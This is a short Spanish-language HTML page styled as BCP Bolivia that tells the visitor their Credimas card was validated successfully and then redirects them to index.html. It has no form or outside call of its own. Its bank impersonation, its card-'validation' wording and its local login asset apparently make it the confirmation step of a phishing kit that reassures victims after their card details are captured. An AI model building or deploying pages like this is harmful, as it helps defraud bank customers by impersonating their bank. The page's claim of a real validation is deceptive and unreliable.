<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>BCP · Validación Exitosa</title>

  <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">

  <style>
    :root {
      --bcp-blue: #0033a0;
      --bcp-orange: #ff6600;
      --white: #fff;
      --radius: 10px;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Nunito Sans', sans-serif;
      background: var(--bcp-blue);
      color: var(--white);
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      text-align: center;
      padding: 30px;
    }

    .logo {
      width: 160px;
      margin-bottom: 30px;
    }

    .checkmark {
      width: 80px;
      height: 80px;
      border-radius: 50%;
      background: var(--bcp-orange);
      display: flex;
      justify-content: center;
      align-items: center;
      margin-bottom: 20px;
      animation: pop 0.6s ease-out;
    }

    .checkmark::before {
      content: "✓";
      font-size: 48px;
      font-weight: 800;
      color: var(--white);
    }

    @keyframes pop {
      0% { transform: scale(0); opacity: 0; }
      60% { transform: scale(1.2); opacity: 1; }
      100% { transform: scale(1); }
    }

    .message {
      font-size: 20px;
      font-weight: 700;
      margin-bottom: 16px;
    }

    .subtext {
      font-size: 16px;
      font-weight: 400;
      opacity: 0.85;
      margin-bottom: 30px;
    }

    .btn {
      background: var(--bcp-orange);
      border: none;
      border-radius: var(--radius);
      padding: 14px 24px;
      color: var(--white);
      font-weight: 800;
      font-size: 15px;
      cursor: pointer;
      transition: background .3s;
    }

    .btn:hover {
      background: #ff7a1a;
    }
  </style>

  <script>
    setTimeout(() => {
      window.location.href = "index.html";
    }, 8000);
  </script>
</head>
<body>
  <img src="icon_bcp_login.svg" alt="BCP Bolivia" class="logo">

  <div class="checkmark"></div>
  <div class="message">✅ Validación exitosa</div>
  <div class="subtext">Gracias por validar tu tarjeta Credimas.<br>Serás redirigido automáticamente en unos segundos.</div>

  <button class="btn" onclick="window.location.href='index.html'">Volver al inicio</button>
</body>
</html>
